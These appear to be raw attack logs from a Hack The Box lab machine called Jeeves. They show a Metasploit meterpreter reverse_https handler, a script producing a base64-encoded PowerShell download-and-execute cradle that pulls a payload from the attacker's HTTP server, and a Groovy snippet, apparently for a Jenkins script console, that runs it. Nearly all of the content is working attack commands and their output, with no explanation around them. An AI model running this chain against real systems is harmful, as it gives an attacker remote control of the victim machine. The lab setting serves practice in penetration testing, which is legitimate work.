IFCONFIG:
3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 100
    link/none 
    inet 10.10.14.173/23 brd 10.10.15.255 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 dead:beef:2::10ab/64 scope global 
       valid_lft forever preferred_lft forever
    inet6 fe80::e122:4343:41cd:6981/64 scope link stable-privacy 





METASPLOIT:
msf exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_https):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.173     yes       The local listener hostname
   LPORT     443              yes       The local listener port
   LURI                       no        The HTTP Path


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://10.10.14.173:443





GENERATE:
root@kali:~/Desktop/HackTheBox/Jeeves# ./generate.sh 
 * Writing Payload
 * Prepping Command
iex (New-Object Net.WebClient).DownloadString('http://10.10.14.173:8000/payload')

 * Encoding command
aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQA3ADMAOgA4ADAAMAAwAC8AcABhAHkAbABvAGEAZAAnACkACgA=

 * Final command
cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQA3ADMAOgA4ADAAMAAwAC8AcABhAHkAbABvAGEAZAAnACkACgA=

 * Starting HTTP Server to serve payload
Serving HTTP on 0.0.0.0 port 8000 ...
10.10.10.63 - - [06/Feb/2018 17:12:58] "GET /payload HTTP/1.1" 200 -




JEEVES:
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQA3ADMAOgA4ADAAMAAwAC8AcABhAHkAbABvAGEAZAAnACkACgA='.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"